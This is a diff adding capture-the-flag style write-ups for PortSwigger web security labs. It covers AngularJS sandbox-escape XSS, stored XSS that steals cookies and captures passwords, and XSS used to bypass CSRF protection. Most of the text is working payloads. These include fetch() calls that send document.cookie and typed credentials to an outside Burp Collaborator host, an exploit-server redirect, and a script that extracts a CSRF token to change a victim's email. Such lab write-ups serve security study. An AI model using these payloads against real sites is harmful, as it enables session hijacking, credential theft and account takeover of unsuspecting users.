@@ -498,3 +498,121 @@ There is a JavaScript template string.
 ```
 ${alert(1)}
 ```
+
+### Lab: Reflected XSS with AngularJS sandbox escape without strings
+
+This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
+
+**Search -> 12345678**
+
+```
+<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>
+
+<body ng-app=labApp>
+	<script>
+		angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+			$scope.query = {};
+			var key = 'search';
+			$scope.query[key] = '12345678';
+			$scope.value = $parse(key)($scope.query);
+		});
+	</script>
+```
+
+[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-\(without-strings\))
+
+`/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+
+### Lab: Reflected XSS with AngularJS sandbox escape and CSP
+
+This lab uses CSP and AngularJS.
+
+```
+<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>
+<body ng-app ng-csp>
+```
+
+_"Search term cannot exceed 70 characters"_
+
+[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(chrome)-shorter](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-\(chrome\)-shorter)
+
+```
+<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>
+```
+
+**Exploit Server ->**
+
+```
+Body: 
+    <script>
+    location = "https://ac9d1f0d1f52bf94c0bf17bc0020006c.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.path%7CorderBy%3A%27%28z%3Dalert%29%28document.cookie%29%27%3E#x"
+    </script>
+```
+
+**Deliver exploit to victim -> Solved.**
+
+We added #x to location parameter. Because victim has to focus on x to get exploit successfully.
+
+### Lab: Exploiting cross-site scripting to steal cookies
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted.
+
+[https://developer.mozilla.org/en-US/docs/Web/API/Fetch\_API/Using\_Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch\_API/Using\_Fetch)
+
+```
+<script>
+fetch('https://ywydligqh0r7wbu3gk3mswlufllc91.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body: document.cookie
+});
+</script>
+```
+
+**Burp Collaborator -> HTTP Request -> Request to Collaborator**
+
+### Lab: Exploiting cross-site scripting to capture passwords
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted.
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://esaw6yr19x66xsnzqct8lua8szypme.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body: username.value+':'+this.value
+});">
+```
+
+**Burp Collaborator -> HTTP Request -> Request to Collaborator**
+
+We got an advantage of using autofill option. When the password field changed, we got victim's credential via fetch request.
+
+### Lab: Exploiting XSS to perform CSRF
+
+This lab contains a stored XSS vulnerability in the blog comments function.
+
+```
+GET /my-account HTTP/1.1
+<input required type="hidden" name="csrf" value="TdBuzBzKRXNHm1pBHc34XP6tNziHynrI">
+
+POST /my-account/change-email HTTP/1.1
+email=test%40test.com&csrf=TdBuzBzKRXNHm1pBHc34XP6tNziHynrI
+```
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+We can bypass csrf protection with extraction and using csrf value via JS.
